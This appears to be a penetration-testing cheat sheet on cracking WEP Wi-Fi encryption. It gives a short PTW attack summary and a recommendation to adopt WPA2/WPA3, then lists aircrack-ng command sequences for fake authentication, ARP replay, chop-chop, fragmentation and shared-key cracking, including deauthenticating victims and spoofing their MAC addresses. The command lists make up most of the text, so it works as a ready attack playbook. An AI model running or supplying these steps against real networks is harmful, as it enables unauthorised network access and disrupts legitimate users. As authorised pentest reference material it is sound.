### PTW Attack (WEP Cryptographic Exploitation) 
An attacker can recover the WEP keys with relatively few packets. The Pychkine, Tews, Weinmann (PTW) attack utilizes ARP response data and recognizes over 5.5 million weak initialization vectors (IV), leading to WEP key recovery. Collecting 85,000 data frames provides a reasonable probability of success for crucial recovery and can be completed in a few minutes. 

Recommendations: WEP is flawed because it only encrypts data packets and uses the stream cipher RC4. REDSEC recommends implementing a more robust security protocol like WPA2 or WPA3.

WEP Attack Process:

    1. Check the SSID and analyze whether SSID is Visible or Hidden.
    2. Check for networks using WEP encryption.
    3. If you find the SSID as visible mode then try to sniff the traffic and check the packet capturing status.
    4. If the packet has been successfully captured and injected then it’s time to break the WEP key - Aircrack-ng or WEPcrack.
    5. If packets are not reliably captured then sniff the traffic again and capture the Packet.
    6. If SSID is in 'Hidden' mode, then Deauthenticate the target client - Commview and Airplay-ng.
    7. Once successfully authenticated with the client and the discovered SSID, then follow the above steps to rediscover other SSIDs.
    8. Check if the Authentication method used is OPN (Open Authentication) or SKA (Shared Key Authentication). 
        If SKA is used, then bypassing mechanism needs to be performed.
        
    9. Check if the STA (stations/clients) are connected to the AP. This information is necessary to perform the attack.
       - If clients are connected - an Interactive packet replay or ARP replay attack needs to be performed to gather 
           IV packets which can be then used to crack the WEP key.
           
       - If there’s no client connected to the AP, Fragmentation Attack or Korex Chop Chop attack needs to be performed 
           to generate the keystream which will be further used to reply to ARP packets.
           
    10. Once the WEP key is cracked, connect to the network using WPA-supplicant and check if the AP is allotting any IP addresses.

Fake Authentication Attack:

    1. airmon-ng start wlan0
    2. airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
    3. macchanger --show wlan0mon
    4. aireplay-ng -1 0 -a <BSSID> -h <OurMac> -e <ESSID> wlan0mon
    5. aireplay-ng -2 –p 0841 –c FF:FF:FF:FF:FF:FF –b <BSSID> -h <OurMac> wlan0mon
    6. aircrack-ng –b <BSSID> <PCAP_of_FileName>
    Other tools that could be used: 
        wifite & Airgeddon.sh (All Attacks in one tool (Replay, Chopchop, Fragment, Hirte, P0841, Caffe-latte)

ARP Replay Attack:

    1. airmon-ng start wlan0
    2. airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
    3. macchanger --show wlan0mon
    4. aireplay-ng -3 –x 1000 –n 1000 –b <BSSID> -h <OurMac> wlan0mon
    5. aircrack-ng –b <BSSID> <PCAP_of_FileName>

Chop Chop Attack:

    1. airmon-ng start wlan0
    2. airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
    3. macchanger --show wlan0mon
    4. aireplay-ng -1 0 –e <ESSID> -a <BSSID> -h <OurMac> wlan0mon
    5. aireplay-ng -4 –b <BSSID> -h <OurMac> wlan0mon
     #Press ‘y’ ;
    6. packetforge-ng -0 –a <BSSID> -h <OurMac> -k <SourceIP> -l <DestinationIP> -y <XOR_PacketFile> -w <FileName2>
    7. aireplay-ng -2 –r <FileName2> wlan0mon
    8. aircrack-ng <PCAP_of_FileName>

Fragmentation Attack:

    1. airmon-ng start wlan0
    2. airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
    3. macchanger --show wlan0mon
    4. aireplay-ng -1 0 –e <ESSID> -a <BSSID> -h <OurMac> wlan0mon
    5. aireplay-ng -5 –b<BSSID> -h < OurMac > wlan0mon
    6. #Press ‘y’ ;
    7. packetforge-ng -0 –a <BSSID> -h < OurMac > -k <SourceIP> -l <DestinationIP> -y <XOR_PacketFile> -w <FileName2>
    8. aireplay-ng -2 –r <FileName2> wlan0mon
    9. aircrack-ng <PCAP_of_FileName>

SKA (Shared Key Authentication) Type Cracking:

    1. airmon-ng start wlan0
    2. airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
    3. aireplay-ng -0 10 –a <BSSID> -c <VictimMac> wlan0mon
    4. ifconfig wlan0mon down
    5. macchanger –-mac <VictimMac> wlan0mon
    6. ifconfig wlan0mon up
    7. aireplay-ng -3 –b <BSSID> -h <FakedMac> wlan0mon
    8. aireplay-ng –-deauth 1 –a <BSSID> -h <FakedMac> wlan0mon
    9. aircrack-ng <PCAP_of_FileName>
